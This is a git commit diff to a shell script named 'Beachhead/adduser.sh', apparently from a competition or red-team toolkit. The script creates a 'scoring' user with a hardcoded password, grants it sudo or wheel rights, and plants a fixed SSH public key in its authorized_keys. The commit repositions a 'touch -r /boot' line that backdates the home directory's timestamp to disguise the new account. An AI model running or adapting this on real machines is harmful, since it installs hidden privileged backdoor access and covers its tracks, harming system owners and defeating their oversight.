7718a048c1351b0c29defe398087322f4a2436a0
github@merisec.com <xync@xync.org>
2023-01-26 13:19:44 -0700

    Corrected username for sudo grant.  Moved home directory date change to final step.

--- Beachhead/adduser.sh
+++ Beachhead/adduser.sh
@@ -6,12 +6,10 @@ useradd -m -s /bin/bash scoring
 echo 'scoring:StandingBy' | chpasswd
 # Put the user in the 'sudo' group on debian or 'wheel' on fedora which will give them sudo permissions
 if [ -f "/etc/debian_version" ]; then
-    usermod -aG sudo johndoe
+    usermod -aG sudo scoring
 else
-    usermod -aG wheel johndoe
+    usermod -aG wheel scoring
 fi
-# Change the timestamp of their home directory to be the last time the kernel was updated
-touch -r /boot /home/scoring
 #useradd -m -s /bin/bash -p '$6$8ANc9NOl$XBXww7b3Wnamz8bDd0by6TucCkxn7QDImrD/krHNuP7Mg6Hek4YZInzuYy56Nv2dVzCwOwxWns.x9a/uXseaH/' scoring
 #echo "${TEAMPASSWD}" | passwd --stdin scoring
 
@@ -21,3 +19,6 @@ chmod go-rwx ~scoring/.ssh/authorized_keys
 chown scoring.scoring ~scoring/.ssh/authorized_keys
 #echo "${SSHPUBKEY}" >> ~scoring/.ssh/authorized_keysecho "
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQDV4HmsuDrNI7MZpsOYxaaOYz5o5ZZ2iGXhK//Mp4tdvLojcBCBX8TZd3o9jOTDhpayVInmvTFDRzNzfz3WxRIvL9jP1s04I/jC4NdD4u1hI1DBP9YaCfYDgd1JZHFueNBWYZpltB/dhQi5es8l+Q0IFCsgWNbQ/oLrx3/cyHugeQ==" >> ~scoring/.ssh/authorized_keys
+
+# Change the timestamp of their home directory to be the last time the kernel was updated (roughly)
+touch -r /boot /home/scoring
